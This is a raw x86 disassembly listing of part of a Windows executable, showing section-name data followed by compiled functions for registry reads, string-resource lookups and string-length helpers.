  4023e6:	add    BYTE PTR [eax],al
  4023e8:	and    BYTE PTR [eax],dl
  4023ea:	add    BYTE PTR [eax],al
  4023ec:	add    al,0x0
  4023ee:	add    BYTE PTR [eax],al
  4023f0:	cs inc ebx
  4023f2:	push   edx
  4023f3:	push   esp
  4023f4:	and    al,0x58
  4023f6:	dec    ecx
  4023f7:	pop    edx
  4023f8:	add    BYTE PTR [eax],al
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	and    al,0x10
  4023fe:	add    BYTE PTR [eax],al
  402400:	add    BYTE PTR [eax],0x0
  402403:	add    BYTE PTR [esi],ch
  402405:	imul   sp,WORD PTR [si+0x73],0x7824
  40240c:	add    BYTE PTR [eax],al
  40240e:	add    BYTE PTR [eax],al
  402410:	mov    al,0x10
  402412:	add    BYTE PTR [eax],al
  402414:	push   eax
  402415:	push   es
  402416:	add    BYTE PTR [eax],al
  402418:	cs jb  0x40247f
  40241b:	popa   
  40241c:	je     0x40247f
  40241e:	add    BYTE PTR [eax],al
  402420:	add    BYTE PTR [edi],dl
  402422:	add    BYTE PTR [eax],al
  402424:	add    al,0x0
  402426:	add    BYTE PTR [eax],al
  402428:	cs jb  0x40248f
  40242b:	popa   
  40242c:	je     0x40248f
  40242e:	and    al,0x73
  402430:	js     0x402496
  402432:	popa   
  402433:	je     0x402496
  402435:	add    BYTE PTR [eax],al
  402437:	add    BYTE PTR [eax],cl
  402439:	pop    ss
  40243a:	add    BYTE PTR [eax],al
  40243c:	adc    BYTE PTR [eax],al
  40243e:	add    BYTE PTR [eax],al
  402440:	cs jb  0x4024a7
  402443:	popa   
  402444:	je     0x4024a7
  402446:	and    al,0x7a
  402448:	inc    ebp
  402449:	push   esp
  40244a:	push   edi
  40244b:	xor    BYTE PTR [eax],al
  40244d:	add    BYTE PTR [eax],al
  40244f:	add    BYTE PTR [eax],bl
  402451:	pop    ss
  402452:	add    BYTE PTR [eax],al
  402454:	mov    ecx,0x2e00000b
  402459:	jb     0x4024bf
  40245b:	popa   
  40245c:	je     0x4024bf
  40245e:	and    al,0x7a
  402460:	inc    ebp
  402461:	push   esp
  402462:	push   edi
  402463:	xor    DWORD PTR [eax],eax
  402465:	add    BYTE PTR [eax],al
  402467:	add    cl,dl
  402469:	and    al,BYTE PTR [eax]
  40246b:	add    BYTE PTR [ebp+0x0],cl
  40246e:	add    BYTE PTR [eax],al
  402470:	cs jb  0x4024d7
  402473:	popa   
  402474:	je     0x4024d7
  402476:	and    al,0x7a
  402478:	inc    ebp
  402479:	push   esp
  40247a:	push   edi
  40247b:	xor    al,BYTE PTR [eax]
  40247d:	add    BYTE PTR [eax],al
  40247f:	add    BYTE PTR [esi],bl
  402481:	and    eax,DWORD PTR [eax]
  402483:	add    BYTE PTR [ecx],al
  402485:	add    BYTE PTR [eax],al
  402487:	add    BYTE PTR [esi],ch
  402489:	jb     0x4024ef
  40248b:	popa   
  40248c:	je     0x4024ef
  40248e:	and    al,0x7a
  402490:	inc    ebp
  402491:	push   esp
  402492:	push   edi
  402493:	cmp    DWORD PTR [eax],eax
  402495:	add    BYTE PTR [eax],al
  402497:	add    BYTE PTR [eax],ah
  402499:	and    eax,DWORD PTR [eax]
  40249b:	add    BYTE PTR [edx+eax*1+0x722e0000],bh
  4024a2:	fs popa 
  4024a4:	je     0x402507
  4024a6:	and    al,0x7a
  4024a8:	jp     0x402524
  4024aa:	bound  esp,QWORD PTR fs:[edi+0x0]
  4024ae:	add    BYTE PTR [eax],al
  4024b0:	fsub   QWORD PTR ds:0x1eb0000
  4024b6:	add    BYTE PTR [eax],al
  4024b8:	cs je  0x402520
  4024bb:	js     0x402531
  4024bd:	add    BYTE PTR [eax],al
  4024bf:	add    bh,al
  4024c1:	daa    
  4024c2:	add    BYTE PTR [eax],al
  4024c4:	xor    eax,0x2e000000
  4024c9:	je     0x402530
  4024cb:	js     0x402541
  4024cd:	and    al,0x64
  4024cf:	imul   eax,DWORD PTR [eax],0x0
  4024d5:	sub    BYTE PTR [eax],al
  4024d7:	add    BYTE PTR [edx+0x2e00004a],dh
  4024dd:	je     0x402544
  4024df:	js     0x402555
  4024e1:	and    al,0x6d
  4024e3:	outs   dx,BYTE PTR ds:[esi]
  4024e4:	add    BYTE PTR [eax],al
  4024e6:	add    BYTE PTR [eax],al
  4024e8:	mov    dl,0x72
  4024ea:	add    BYTE PTR [eax],al
  4024ec:	lock add BYTE PTR [eax],al
  4024ef:	add    BYTE PTR [esi],ch
  4024f1:	je     0x402558
  4024f3:	js     0x402569
  4024f5:	and    al,0x79
  4024f7:	add    BYTE PTR fs:[eax],al
  4024fa:	add    BYTE PTR [eax],al
  4024fc:	test   al,0x73
  4024fe:	add    BYTE PTR [eax],al
  402500:	mov    eax,0x2e000000
  402505:	js     0x40256b
  402507:	popa   
  402508:	je     0x40256b
  40250a:	and    al,0x78
  40250c:	add    BYTE PTR [eax],al
  40250e:	add    BYTE PTR [eax],al
  402510:	add    BYTE PTR [eax+0x500000],al
  402516:	add    BYTE PTR [eax],al
  402518:	cs fs popa 
  40251b:	je     0x40257e
  40251d:	add    BYTE PTR [eax],al
  40251f:	add    BYTE PTR [eax-0x80],dl
  402522:	add    BYTE PTR [eax],al
  402524:	and    al,BYTE PTR [eax]
  402526:	add    BYTE PTR [eax],al
  402528:	cs fs popa 
  40252b:	je     0x40258e
  40252d:	and    al,0x72
  40252f:	add    BYTE PTR [eax-0x80],bh
  402532:	add    BYTE PTR [eax],al
  402534:	xchg   esp,eax
  402535:	add    al,0x0
  402537:	add    BYTE PTR [esi],ch
  402539:	bound  esi,QWORD PTR [ebx+0x73]
  40253c:	add    BYTE PTR [eax],al
  40253e:	add    BYTE PTR [eax],al
  402540:	add    BYTE PTR [eax+0x2100000],dl
  402546:	add    BYTE PTR [eax],al
  402548:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  402551:	add    BYTE PTR [eax],al
  402553:	add    BYTE PTR [eax],dl
  402555:	xchg   edx,eax
  402556:	add    BYTE PTR [eax],al
  402558:	add    al,0x0
  40255a:	add    BYTE PTR [eax],al
  40255c:	xor    BYTE PTR cs:[eax],dh
  40255f:	arpl   WORD PTR [esi+0x67],sp
  402562:	add    BYTE PTR [eax],al
  402564:	adc    al,0x92
  402566:	add    BYTE PTR [eax],al
  402568:	sub    al,0x1
  40256a:	add    BYTE PTR [eax],al
  40256c:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  402575:	add    BYTE PTR [eax],al
  402577:	add    BYTE PTR [eax-0x6d],al
  40257a:	add    BYTE PTR [eax],al
  40257c:	adc    al,0x0
  40257e:	add    BYTE PTR [eax],al
  402580:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  402589:	add    BYTE PTR [eax],al
  40258b:	add    BYTE PTR [ebx+edx*4+0x0],dl
  40258f:	add    BYTE PTR [eax],dl
  402591:	add    al,BYTE PTR [eax]
  402593:	add    BYTE PTR [esi],ch
  402595:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  40259d:	add    BYTE PTR [eax],al
  40259f:	add    BYTE PTR [ebp+edx*4+0x0],ah
  4025a3:	add    BYTE PTR [edx+0x8],dh
  4025a6:	add    BYTE PTR [eax],al
  4025a8:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  4025b1:	add    BYTE PTR [eax],al
  4025b3:	add    BYTE PTR [eax],al
  4025b5:	mov    al,ds:0x1b00000
  4025ba:	add    BYTE PTR [eax],al
  4025bc:	cs jb  0x402632
  4025bf:	jb     0x402624
  4025c1:	and    al,0x30
  4025c3:	xor    DWORD PTR [eax],eax
  4025c5:	add    BYTE PTR [eax],al
  4025c7:	add    BYTE PTR [eax+0x500000a1],dh
  4025cd:	or     eax,0x722e0000
  4025d2:	jae    0x402646
  4025d4:	arpl   WORD PTR [eax+esi*1],sp
  4025d7:	xor    al,BYTE PTR [eax]
	...
  4025ed:	add    BYTE PTR [eax],al
  4025ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4025f5:	push   ecx
  4025f6:	mov    eax,ds:0x408004
  4025fb:	xor    eax,ebp
  4025fd:	mov    DWORD PTR [ebp-0x4],eax
  402600:	mov    eax,DWORD PTR [ebp+0x28]
  402603:	test   eax,eax
  402605:	je     0x402672
  402607:	mov    ecx,DWORD PTR [ebp+0xc]
  40260a:	mov    edx,DWORD PTR [ebp+0x10]
  40260d:	push   ebx
  40260e:	mov    ebx,DWORD PTR [ebp+0x1c]
  402611:	push   edi
  402612:	mov    edi,DWORD PTR [ebp+0x20]
  402615:	sub    ecx,0x0
  402618:	je     0x402644
  40261a:	sub    ecx,0x1
  40261d:	jne    0x402647
  40261f:	test   dl,dl
  402621:	je     0x402629
  402623:	movzx  ecx,dl
  402626:	inc    ecx
  402627:	jmp    0x40262e
  402629:	mov    ecx,0x100
  40262e:	mov    DWORD PTR [eax],ecx
  402630:	mov    ecx,DWORD PTR [ebp+0x14]
  402633:	mov    DWORD PTR [eax+0x8],ecx
  402636:	mov    ecx,DWORD PTR [ebp+0x18]
  402639:	mov    DWORD PTR [eax+0xc],ecx
  40263c:	mov    DWORD PTR [eax+0x10],ebx
  40263f:	mov    DWORD PTR [eax+0x14],edi
  402642:	jmp    0x40264a
  402644:	and    DWORD PTR [eax],0x0
  402647:	mov    ecx,DWORD PTR [ebp+0x18]
  40264a:	push   esi
  40264b:	mov    esi,DWORD PTR [eax+0x20]
  40264e:	test   esi,esi
  402650:	je     0x40266f
  402652:	push   DWORD PTR [eax+0x24]
  402655:	push   DWORD PTR [ebp+0x24]
  402658:	push   edi
  402659:	push   ebx
  40265a:	push   ecx
  40265b:	push   DWORD PTR [ebp+0x14]
  40265e:	mov    ecx,esi
  402660:	push   edx
  402661:	push   DWORD PTR [ebp+0xc]
  402664:	push   DWORD PTR [ebp+0x8]
  402667:	call   DWORD PTR ds:0x409210
  40266d:	call   esi
  40266f:	pop    esi
  402670:	pop    edi
  402671:	pop    ebx
  402672:	mov    ecx,DWORD PTR [ebp-0x4]
  402675:	xor    ecx,ebp
  402677:	call   0x406b70
  40267c:	mov    esp,ebp
  40267e:	pop    ebp
  40267f:	ret    0x24
  402682:	int3   
  402683:	int3   
  402684:	int3   
  402685:	int3   
  402686:	int3   
  402687:	mov    edi,edi
  402689:	push   ebp
  40268a:	mov    ebp,esp
  40268c:	sub    esp,0x10
  40268f:	mov    al,ds:0x40231e
  402694:	movzx  eax,BYTE PTR [edx]
  402697:	push   esi
  402698:	shl    eax,0x18
  40269b:	mov    esi,edx
  40269d:	push   edi
  40269e:	sub    esi,0x401708
  4026a4:	mov    edi,ecx
  4026a6:	mov    ecx,DWORD PTR [ebp+0x14]
  4026a9:	or     eax,esi
  4026ab:	push   0x2
  4026ad:	pop    esi
  4026ae:	mov    DWORD PTR [ebp-0x10],eax
  4026b1:	inc    edx
  4026b2:	push   ecx
  4026b3:	push   DWORD PTR [ebp+0x10]
  4026b6:	movzx  eax,WORD PTR [edx]
  4026b9:	add    edx,esi
  4026bb:	push   DWORD PTR [ebp+0xc]
  4026be:	mov    DWORD PTR [ebp-0xc],eax
  4026c1:	push   DWORD PTR [ebp+0x8]
  4026c4:	mov    eax,DWORD PTR [edx]
  4026c6:	mov    DWORD PTR [ebp-0x8],eax
  4026c9:	mov    eax,DWORD PTR [edx+0x4]
  4026cc:	add    edx,0x8
  4026cf:	mov    DWORD PTR [ebp-0x4],eax
  4026d2:	mov    eax,DWORD PTR [edi+0x4]
  4026d5:	and    DWORD PTR [ecx+0x4],0x0
  4026d9:	mov    DWORD PTR [ecx],eax
  4026db:	mov    eax,DWORD PTR [edi+0x4]
  4026de:	movzx  eax,WORD PTR [eax]
  4026e1:	and    DWORD PTR [ecx+0x14],0x0
  4026e5:	mov    DWORD PTR [ecx+0x8],eax
  4026e8:	mov    DWORD PTR [ecx+0xc],esi
  4026eb:	mov    DWORD PTR [ecx+0x10],edx
  4026ee:	movzx  eax,WORD PTR [edx]
  4026f1:	mov    DWORD PTR [ecx+0x18],eax
  4026f4:	lea    eax,[ebp-0x10]
  4026f7:	push   eax
  4026f8:	mov    DWORD PTR [ecx+0x1c],0x1
  4026ff:	push   DWORD PTR [edi+0x1c]
  402702:	push   DWORD PTR [edi+0x18]
  402705:	call   DWORD PTR ds:0x409018
  40270b:	pop    edi
  40270c:	pop    esi
  40270d:	mov    esp,ebp
  40270f:	pop    ebp
  402710:	ret    0x10
  402713:	int3   
  402714:	int3   
  402715:	int3   
  402716:	int3   
  402717:	int3   
  402718:	mov    edi,edi
  40271a:	push   ebp
  40271b:	mov    ebp,esp
  40271d:	mov    edx,DWORD PTR [ecx+0x8]
  402720:	mov    eax,DWORD PTR [ecx+0xc]
  402723:	and    edx,DWORD PTR [ebp+0x8]
  402726:	and    eax,DWORD PTR [ebp+0xc]
  402729:	or     edx,eax
  40272b:	je     0x402747
  40272d:	mov    eax,DWORD PTR [ecx+0x10]
  402730:	mov    edx,DWORD PTR [ecx+0x14]
  402733:	and    eax,DWORD PTR [ebp+0x8]
  402736:	and    edx,DWORD PTR [ebp+0xc]
  402739:	cmp    eax,DWORD PTR [ecx+0x10]
  40273c:	jne    0x402747
  40273e:	cmp    edx,DWORD PTR [ecx+0x14]
  402741:	jne    0x402747
  402743:	mov    al,0x1
  402745:	jmp    0x402749
  402747:	xor    al,al
  402749:	pop    ebp
  40274a:	ret    0x8
  40274d:	int3   
  40274e:	int3   
  40274f:	int3   
  402750:	int3   
  402751:	int3   
  402752:	mov    edi,edi
  402754:	push   esi
  402755:	xor    esi,esi
  402757:	push   edi
  402758:	mov    edi,0x4013ee
  40275d:	test   edx,edx
  40275f:	je     0x402771
  402761:	mov    esi,edx
  402763:	mov    edi,edx
  402765:	lea    edx,[esi+0x1]
  402768:	mov    al,BYTE PTR [esi]
  40276a:	inc    esi
  40276b:	test   al,al
  40276d:	jne    0x402768
  40276f:	sub    esi,edx
  402771:	and    DWORD PTR [ecx+0x4],0x0
  402775:	lea    eax,[esi+0x1]
  402778:	and    DWORD PTR [ecx+0xc],0x0
  40277c:	mov    DWORD PTR [ecx],edi
  40277e:	pop    edi
  40277f:	mov    DWORD PTR [ecx+0x8],eax
  402782:	pop    esi
  402783:	ret    
  402784:	int3   
  402785:	int3   
  402786:	int3   
  402787:	int3   
  402788:	int3   
  402789:	mov    edi,edi
  40278b:	push   ebx
  40278c:	push   esi
  40278d:	xor    ebx,ebx
  40278f:	mov    esi,ebx
  402791:	push   edi
  402792:	mov    edi,0x4013f0
  402797:	test   edx,edx
  402799:	je     0x4027b1
  40279b:	mov    esi,edx
  40279d:	mov    edi,edx
  40279f:	lea    edx,[esi+0x2]
  4027a2:	mov    ax,WORD PTR [esi]
  4027a5:	add    esi,0x2
  4027a8:	cmp    ax,bx
  4027ab:	jne    0x4027a2
  4027ad:	sub    esi,edx
  4027af:	sar    esi,1
  4027b1:	mov    DWORD PTR [ecx],edi
  4027b3:	lea    eax,[esi*2+0x2]
  4027ba:	pop    edi
  4027bb:	pop    esi
  4027bc:	mov    DWORD PTR [ecx+0x4],ebx
  4027bf:	mov    DWORD PTR [ecx+0xc],ebx
  4027c2:	mov    DWORD PTR [ecx+0x8],eax
  4027c5:	pop    ebx
  4027c6:	ret    
  4027c7:	int3   
  4027c8:	int3   
  4027c9:	int3   
  4027ca:	int3   
  4027cb:	int3   
  4027cc:	int3   
  4027cd:	int3   
  4027ce:	int3   
  4027cf:	int3   
  4027d0:	mov    DWORD PTR ds:0x408400,0x403e10
  4027da:	mov    DWORD PTR ds:0x4083f8,0x403f00
  4027e4:	mov    DWORD PTR ds:0x4083fc,0x403f50
  4027ee:	ret    
  4027ef:	int3   
  4027f0:	push   0x4072c0
  4027f5:	call   0x406d67
  4027fa:	pop    ecx
  4027fb:	ret    
  4027fc:	int3   
  4027fd:	int3   
  4027fe:	int3   
  4027ff:	int3   
  402800:	int3   
  402801:	int3   
  402802:	int3   
  402803:	int3   
  402804:	int3   
  402805:	mov    edi,edi
  402807:	push   ebp
  402808:	mov    ebp,esp
  40280a:	sub    esp,0x21c
  402810:	mov    eax,ds:0x408004
  402815:	xor    eax,ebp
  402817:	mov    DWORD PTR [ebp-0x4],eax
  40281a:	push   ebx
  40281b:	push   esi
  40281c:	xor    ebx,ebx
  40281e:	xor    esi,esi
  402820:	cmp    DWORD PTR ds:0x4083c4,ebx
  402826:	jne    0x402919
  40282c:	lea    eax,[ebp-0x210]
  402832:	push   eax
  402833:	push   0x1
  402835:	push   esi
  402836:	push   0x401108
  40283b:	push   0x80000001
  402840:	call   DWORD PTR ds:0x409000
  402846:	test   eax,eax
  402848:	jne    0x402919
  40284e:	push   0x4
  402850:	call   DWORD PTR ds:0x40903c
  402856:	mov    ds:0x4083c4,eax
  40285b:	test   eax,eax
  40285d:	je     0x40290d
  402863:	inc    esi
  402864:	push   edi
  402865:	lea    eax,[ebp-0x214]
  40286b:	mov    DWORD PTR [ebp-0x218],0x104
  402875:	push   eax
  402876:	push   0x0
  402878:	push   0x0
  40287a:	push   0x0
  40287c:	lea    eax,[ebp-0x218]
  402882:	push   eax
  402883:	lea    eax,[ebp-0x20c]
  402889:	push   eax
  40288a:	push   ebx
  40288b:	push   DWORD PTR [ebp-0x210]
  402891:	call   DWORD PTR ds:0x409004
  402897:	mov    DWORD PTR [ebp-0x21c],eax
  40289d:	test   eax,eax
  40289f:	jne    0x4028f5
  4028a1:	push   DWORD PTR [ebp-0x214]
  4028a7:	push   0x40
  4028a9:	call   DWORD PTR ds:0x4090bc
  4028af:	mov    edi,eax
  4028b1:	test   edi,edi
  4028b3:	je     0x40290a
  4028b5:	lea    eax,[ebp-0x214]
  4028bb:	push   eax
  4028bc:	push   edi
  4028bd:	push   0x0
  4028bf:	push   0x0
  4028c1:	lea    eax,[ebp-0x20c]
  4028c7:	push   eax
  4028c8:	push   DWORD PTR [ebp-0x210]
  4028ce:	call   DWORD PTR ds:0x409008
  4028d4:	test   eax,eax
  4028d6:	jne    0x402903
  4028d8:	push   edi
  4028d9:	push   0x7fffffff
  4028de:	push   DWORD PTR ds:0x4083c4
  4028e4:	call   DWORD PTR ds:0x409030
  4028ea:	cmp    eax,0xffffffff
  4028ed:	je     0x402903
  4028ef:	mov    eax,DWORD PTR [ebp-0x21c]
  4028f5:	inc    ebx
  4028f6:	cmp    eax,0x103
  4028fb:	jne    0x402865
  402901:	jmp    0x40290c
  402903:	push   edi
  402904:	call   DWORD PTR ds:0x4090b8
  40290a:	xor    esi,esi
  40290c:	pop    edi
  40290d:	push   DWORD PTR [ebp-0x210]
  402913:	call   DWORD PTR ds:0x40900c
  402919:	mov    ecx,DWORD PTR [ebp-0x4]
  40291c:	mov    eax,esi
  40291e:	pop    esi
  40291f:	xor    ecx,ebp
  402921:	pop    ebx
  402922:	call   0x406b70
  402927:	mov    esp,ebp
  402929:	pop    ebp
  40292a:	ret    
  40292b:	int3   
  40292c:	int3   
  40292d:	int3   
  40292e:	int3   
  40292f:	int3   
  402930:	mov    eax,ds:0x4083c4
  402935:	push   ebx
  402936:	mov    ebx,ecx
  402938:	test   eax,eax
  40293a:	jne    0x40294c
  40293c:	call   0x402805
  402941:	test   eax,eax
  402943:	jne    0x402947
  402945:	pop    ebx
  402946:	ret    
  402947:	mov    eax,ds:0x4083c4
  40294c:	push   esi
  40294d:	push   edi
  40294e:	mov    edi,DWORD PTR [eax]
  402950:	xor    esi,esi
  402952:	test   edi,edi
  402954:	jle    0x40297e
  402956:	push   esi
  402957:	push   eax
  402958:	call   DWORD PTR ds:0x409034
  40295e:	test   eax,eax
  402960:	je     0x40296e
  402962:	push   eax
  402963:	push   ebx
  402964:	call   DWORD PTR ds:0x4090b4
  40296a:	test   eax,eax
  40296c:	je     0x40297a
  40296e:	inc    esi
  40296f:	cmp    esi,edi
  402971:	jge    0x40297e
  402973:	mov    eax,ds:0x4083c4
  402978:	jmp    0x402956
  40297a:	xor    eax,eax
  40297c:	jmp    0x402985
  40297e:	push   ebx
  40297f:	call   DWORD PTR ds:0x4090f4
  402985:	pop    edi
  402986:	pop    esi
  402987:	pop    ebx
  402988:	ret    
  402989:	int3   
  40298a:	int3   
  40298b:	int3   
  40298c:	int3   
  40298d:	int3   
  40298e:	mov    edi,edi
  402990:	push   ebx
  402991:	mov    ebx,ecx
  402993:	push   esi
  402994:	push   edi
  402995:	xor    esi,esi
  402997:	xor    edi,edi
  402999:	movzx  ecx,WORD PTR [ebx]
  40299c:	mov    eax,ebx
  40299e:	test   cx,cx
  4029a1:	je     0x4029c7
  4029a3:	cmp    cx,0x3a
  4029a7:	jne    0x4029af
  4029a9:	test   esi,esi
  4029ab:	je     0x4029cd
  4029ad:	mov    edi,esi
  4029af:	xor    esi,esi
  4029b1:	push   eax
  4029b2:	call   DWORD PTR ds:0x409134
  4029b8:	movzx  ecx,WORD PTR [eax]
  4029bb:	test   cx,cx
  4029be:	jne    0x4029a3
  4029c0:	lea    eax,[edi+0x4]
  4029c3:	test   edi,edi
  4029c5:	jne    0x4029c9
  4029c7:	mov    eax,ebx
  4029c9:	pop    edi
  4029ca:	pop    esi
  4029cb:	pop    ebx
  4029cc:	ret    
  4029cd:	mov    esi,eax
  4029cf:	jmp    0x4029b1
  4029d1:	int3   
  4029d2:	int3   
  4029d3:	int3   
  4029d4:	int3   
  4029d5:	int3   
  4029d6:	mov    edi,edi
  4029d8:	push   ebp
  4029d9:	mov    ebp,esp
  4029db:	mov    eax,0x2b1c
  4029e0:	call   0x407270
  4029e5:	mov    eax,ds:0x408004
  4029ea:	xor    eax,ebp
  4029ec:	mov    DWORD PTR [ebp-0x4],eax
  4029ef:	push   ebx
  4029f0:	push   esi
  4029f1:	mov    esi,DWORD PTR [ebp+0x8]
  4029f4:	xor    eax,eax
  4029f6:	push   edi
  4029f7:	mov    edi,eax
  4029f9:	mov    DWORD PTR [ebp-0x2b00],edx
  4029ff:	push   0x20
  402a01:	lea    eax,[ebp-0x44]
  402a04:	mov    DWORD PTR [ebp-0x2b10],ecx
  402a0a:	push   eax
  402a0b:	push   0xc9
  402a10:	push   DWORD PTR ds:0x4084fc
  402a16:	mov    DWORD PTR [ebp-0x2b08],esi
  402a1c:	mov    DWORD PTR [ebp-0x2b0c],edi
  402a22:	call   DWORD PTR ds:0x409130
  402a28:	mov    ebx,DWORD PTR [ebp+0x10]
  402a2b:	test   eax,eax
  402a2d:	je     0x402a57
  402a2f:	test   ebx,0x400
  402a35:	jne    0x402a4b
  402a37:	lea    eax,[ebp-0x44]
  402a3a:	push   eax
  402a3b:	push   DWORD PTR [ebp-0x2b00]
  402a41:	call   DWORD PTR ds:0x4090b4
  402a47:	test   eax,eax
  402a49:	jne    0x402a57
  402a4b:	push   0x5
  402a4d:	pop    edi
  402a4e:	mov    DWORD PTR [ebp-0x2b0c],edi
  402a54:	or     ebx,0x8
  402a57:	push   0xa000
  402a5c:	push   0x40
  402a5e:	call   DWORD PTR ds:0x4090b0
  402a64:	mov    DWORD PTR [ebp-0x2b1c],eax
  402a6a:	test   eax,eax
  402a6c:	je     0x4032bb
  402a72:	push   eax
  402a73:	call   DWORD PTR ds:0x409064
  402a79:	mov    DWORD PTR [ebp-0x2b14],eax
  402a7f:	test   eax,eax
  402a81:	je     0x4032af
  402a87:	xor    eax,eax
  402a89:	push   0x20
  402a8b:	mov    WORD PTR [ebp-0x25c],ax
  402a92:	lea    eax,[ebp-0x44]
  402a95:	push   eax
  402a96:	push   0xca
  402a9b:	push   DWORD PTR ds:0x4084fc
  402aa1:	call   DWORD PTR ds:0x409130
  402aa7:	test   eax,eax
  402aa9:	je     0x402aed
  402aab:	test   ebx,0x100
  402ab1:	jne    0x402ac2
  402ab3:	push   esi
  402ab4:	lea    eax,[ebp-0x44]
  402ab7:	push   eax
  402ab8:	call   DWORD PTR ds:0x4090b4
  402abe:	test   eax,eax
  402ac0:	jne    0x402aed
  402ac2:	push   0x6
  402ac4:	pop    edi
  402ac5:	push   0x104
  402aca:	lea    eax,[ebp-0x25c]
  402ad0:	mov    DWORD PTR [ebp-0x2b0c],edi
  402ad6:	push   eax
  402ad7:	xor    eax,eax
  402ad9:	push   eax
  402ada:	push   eax
  402adb:	push   0x40160c
  402ae0:	call   DWORD PTR ds:0x4090f0
  402ae6:	test   eax,eax
  402ae8:	js     0x402aed
  402aea:	and    ebx,0xfffffffe
  402aed:	push   0x20
  402aef:	lea    eax,[ebp-0x44]
  402af2:	push   eax
  402af3:	push   0xcb
  402af8:	push   DWORD PTR ds:0x4084fc
  402afe:	call   DWORD PTR ds:0x409130
  402b04:	test   eax,eax
  402b06:	je     0x402b32
  402b08:	test   ebx,0x200
  402b0e:	jne    0x402b26
  402b10:	push   esi
  402b11:	call   DWORD PTR ds:0x409128
  402b17:	push   eax
  402b18:	lea    eax,[ebp-0x44]
  402b1b:	push   eax
  402b1c:	call   DWORD PTR ds:0x4090ac
  402b22:	test   eax,eax
  402b24:	jne    0x402b32
  402b26:	push   0x3
  402b28:	pop    edi
  402b29:	mov    DWORD PTR [ebp-0x2b0c],edi
  402b2f:	and    ebx,0xfffffffe
  402b32:	push   0x20
  402b34:	lea    eax,[ebp-0x44]
  402b37:	push   eax
  402b38:	push   0xcc
  402b3d:	push   DWORD PTR ds:0x4084fc
  402b43:	call   DWORD PTR ds:0x409130
  402b49:	test   eax,eax
  402b4b:	je     0x402b6b
  402b4d:	push   esi
  402b4e:	lea    eax,[ebp-0x44]
  402b51:	push   eax
  402b52:	call   DWORD PTR ds:0x4090ac
  402b58:	test   eax,eax
  402b5a:	jne    0x402b6b
  402b5c:	push   0x4
  402b5e:	pop    edi
  402b5f:	and    ebx,0xfffffffe
  402b62:	mov    DWORD PTR [ebp-0x2b0c],edi
  402b68:	or     ebx,0x20
  402b6b:	lea    eax,[ebp-0x2b04]
  402b71:	xor    ecx,ecx
  402b73:	push   eax
  402b74:	push   0x4015fc
  402b79:	push   0x1
  402b7b:	push   ecx
  402b7c:	push   0x40161c
  402b81:	call   DWORD PTR ds:0x409144
  402b87:	test   eax,eax
  402b89:	js     0x4032a3
  402b8f:	mov    eax,DWORD PTR [ebp-0x2b04]
  402b95:	lea    ecx,[ebp-0x2b18]
  402b9b:	push   ecx
  402b9c:	push   0x40162c
  402ba1:	push   eax
  402ba2:	mov    esi,DWORD PTR [eax]
  402ba4:	mov    esi,DWORD PTR [esi]
  402ba6:	mov    ecx,esi
  402ba8:	call   DWORD PTR ds:0x409210
  402bae:	call   esi
  402bb0:	test   eax,eax
  402bb2:	js     0x40328d
  402bb8:	push   DWORD PTR [ebp-0x2b10]
  402bbe:	mov    esi,DWORD PTR [ebp-0x2b14]
  402bc4:	push   0x5000
  402bc9:	push   esi
  402bca:	push   DWORD PTR [ebp-0x2b00]
  402bd0:	call   DWORD PTR ds:0x409078
  402bd6:	cmp    eax,0x4ffe
  402bdb:	je     0x403242
  402be1:	cmp    WORD PTR [ebp-0x25c],0x0
  402be9:	mov    DWORD PTR [ebp-0x2b00],esi
  402bef:	jne    0x402c92
  402bf5:	mov    esi,DWORD PTR [ebp-0x2b08]
  402bfb:	push   esi
  402bfc:	call   DWORD PTR ds:0x409100
  402c02:	cmp    eax,0xffffffff
  402c05:	jne    0x402c64
  402c07:	push   esi
  402c08:	call   DWORD PTR ds:0x4090fc
  402c0e:	test   eax,eax
  402c10:	jne    0x402c64
  402c12:	push   0x104
  402c17:	lea    eax,[ebp-0x25c]
  402c1d:	push   eax
  402c1e:	xor    eax,eax
  402c20:	push   eax
  402c21:	push   eax
  402c22:	push   0x4015ec
  402c27:	call   DWORD PTR ds:0x4090f0
  402c2d:	lea    eax,[ebp-0x25c]
  402c33:	push   eax
  402c34:	call   DWORD PTR ds:0x40904c
  402c3a:	push   esi
  402c3b:	lea    eax,[ebp+eax*2-0x25c]
  402c42:	mov    DWORD PTR [ebp-0x2b10],eax
  402c48:	lea    eax,[ebp-0x25c]
  402c4e:	push   eax
  402c4f:	call   DWORD PTR ds:0x409124
  402c55:	mov    ecx,DWORD PTR [ebp-0x2b10]
  402c5b:	test   edi,edi
  402c5d:	jne    0x402c80
  402c5f:	xor    esi,esi
  402c61:	inc    esi
  402c62:	jmp    0x402c86
  402c64:	push   esi
  402c65:	mov    edx,0x104
  402c6a:	lea    ecx,[ebp-0x25c]
  402c70:	call   0x4038fa
  402c75:	push   0x2
  402c77:	lea    ecx,[ebp-0x258]
  402c7d:	pop    esi
  402c7e:	jmp    0x402c86
  402c80:	mov    esi,DWORD PTR [ebp-0x2b0c]
  402c86:	mov    edx,0x1ec
  402c8b:	call   0x403ae9
  402c90:	jmp    0x402c98
  402c92:	mov    esi,DWORD PTR [ebp-0x2b0c]
  402c98:	cmp    DWORD PTR ds:0x408504,0x0
  402c9f:	mov    eax,ds:0x408500
  402ca4:	mov    DWORD PTR [ebp-0x2b10],eax
  402caa:	setne  BYTE PTR [ebp-0x2b08]
  402cb1:	push   0xc0
  402cb6:	xor    eax,eax
  402cb8:	push   eax
  402cb9:	call   DWORD PTR ds:0x4090bc
  402cbf:	mov    edi,eax
  402cc1:	test   edi,edi
  402cc3:	je     0x402cf2
  402cc5:	push   ecx
  402cc6:	push   0x4015e0
  402ccb:	call   0x404cee
  402cd0:	push   eax
  402cd1:	mov    ecx,edi
  402cd3:	call   0x405e8c
  402cd8:	push   DWORD PTR [ebp-0x2b08]
  402cde:	mov    ecx,edi
  402ce0:	mov    DWORD PTR [edi],0x4010fc
  402ce6:	push   DWORD PTR [ebp-0x2b10]
  402cec:	push   esi
  402ced:	call   0x405bb3
  402cf2:	cmp    DWORD PTR [ebp+0xc],0x0
  402cf6:	je     0x402d20
  402cf8:	test   bl,0x20
  402cfb:	jne    0x402d20
